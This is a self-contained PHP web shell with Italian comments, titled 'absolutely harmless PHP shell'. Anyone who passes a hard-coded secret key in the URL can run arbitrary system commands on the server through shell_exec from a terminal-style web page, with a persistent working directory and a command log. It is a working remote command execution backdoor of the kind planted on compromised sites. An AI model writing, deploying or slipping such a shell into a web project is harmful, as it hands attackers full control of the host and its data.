<?php
// Configurazione
define('SECRET_KEY', 'mysecretkey'); // Chiave segreta
define('LOG_FILE', 'command_log.txt'); // File di log

// Protezione con chiave segreta hashata
if (!isset($_GET['key']) || hash('sha256', $_GET['key']) !== hash('sha256', SECRET_KEY)) {
    die('Access denied');
}

// Logging dei comandi
function log_command($cmd) {
    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] $cmd\n", FILE_APPEND);
}

// Variabile per mantenere lo stato della directory
session_start();
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd(); // Directory iniziale
}

// Cambio directory persistente
if (isset($_POST['cmd']) && preg_match('/^cd\s+(.+)/', $_POST['cmd'], $matches)) {
    $new_dir = $matches[1];
    if (is_dir($new_dir) && chdir($new_dir)) {
        $_SESSION['current_dir'] = realpath($new_dir);
        echo "Directory cambiata: " . $_SESSION['current_dir'] . "\n";
    } else {
        echo "Errore: directory non valida.\n";
    }
    exit;
}

// Esecuzione dei comandi nella directory corrente
if (isset($_POST['cmd'])) {
    chdir($_SESSION['current_dir']);
    $cmd = $_POST['cmd'];
    log_command($cmd);
    // Supporta comandi interattivi e visualizzazione del terminale
    $output = shell_exec($cmd . " 2>&1");
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Interactive Shell</title>
    <style>
        body {
            font-family: monospace;
            background-color: #000;
            color: #0f0;
        }
        #terminal {
            width: 100%;
            height: 70vh;
            background: #111;
            border: 1px solid #333;
            overflow-y: scroll;
            padding: 10px;
            white-space: pre-wrap;
        }
        #command {
            width: 100%;
            padding: 10px;
            background: #222;
            color: #0f0;
            border: 1px solid #333;
        }
        button {
            background: #444;
            color: #fff;
            border: none;
            padding: 10px;
            cursor: pointer;
        }
    </style>
    <script>
        async function sendCommand() {
            const cmdInput = document.getElementById('command');
            const terminal = document.getElementById('terminal');
            const cmd = cmdInput.value;
            
            const response = await fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'cmd=' + encodeURIComponent(cmd)
            });
            
            const output = await response.text();
            terminal.innerHTML += `$ ${cmd}\n${output}\n`;
            terminal.scrollTop = terminal.scrollHeight; // Scorri verso il basso
            cmdInput.value = '';
        }

        document.addEventListener('DOMContentLoaded', () => {
            const cmdInput = document.getElementById('command');
            cmdInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    sendCommand();
                }
            });
        });
    </script>
</head>
<body>
    <h1>Shell PHP assolutamente innocua</h1>
    <div id="terminal"></div>
    <input type="text" id="command" placeholder="Enter command..." autofocus />
    <button onclick="sendCommand()">Execute</button>
</body>
</html>
